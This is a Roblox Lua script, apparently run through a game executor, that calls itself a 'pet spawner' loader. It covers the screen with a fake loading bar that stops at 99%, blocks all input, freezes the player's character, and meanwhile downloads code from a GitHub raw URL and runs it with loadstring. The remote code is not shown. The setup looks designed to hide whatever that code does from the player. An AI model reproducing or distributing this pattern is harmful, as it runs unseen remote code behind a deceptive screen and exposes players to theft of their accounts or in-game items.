-- Fullscreen Loading Screen + Loads Spawner with Functions

local UIS = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

-- Block all input
UIS.InputBegan:Connect(function()
	if CoreGui:FindFirstChild("FullScreenLoading") then
		return Enum.ContextActionResult.Sink
	end
end)

-- Setup GUI
local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "FullScreenLoading"
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

local percentText = Instance.new("TextLabel", bg)
percentText.Size = UDim2.new(1, 0, 0.1, 0)
percentText.Position = UDim2.new(0, 0, 0.4, 0)
percentText.BackgroundTransparency = 1
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.TextScaled = true
percentText.Font = Enum.Font.GothamBold
percentText.Text = "🌱 Loading... 1%"

local barBG = Instance.new("Frame", bg)
barBG.Size = UDim2.new(0.6, 0, 0.04, 0)
barBG.Position = UDim2.new(0.2, 0, 0.5, 0)
barBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
barBG.ClipsDescendants = true

local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)

-- Freeze movement
local char = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
local hum = char and char:FindFirstChildOfClass("Humanoid")
if hum then
	hum.WalkSpeed = 0
	hum.JumpPower = 0
end

-- Animate bar
task.spawn(function()
	for i = 1, 99 do
		barFill.Size = UDim2.new(i / 100, 0, 1, 0)
		percentText.Text = "🌱 Loading... " .. i .. "%"
		wait(3)
	end
	percentText.Text = "🌱 Loading... 99%"
end)

-- ⬇️ Load the actual spawner script and store functions
local Spawner
local success = pcall(function()
	Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pragsz868/PetSpawnerScript/refs/heads/main/d4b102da3a53b9ef4b29251678adfba2.txt"))()
end)

if success and typeof(Spawner) == "table" then
	warn("✅ Spawner loaded. You can now use Spawner.SpawnPet(), Spawner.Load(), etc.")
else
	warn("❌ Failed to load Spawner.")
end
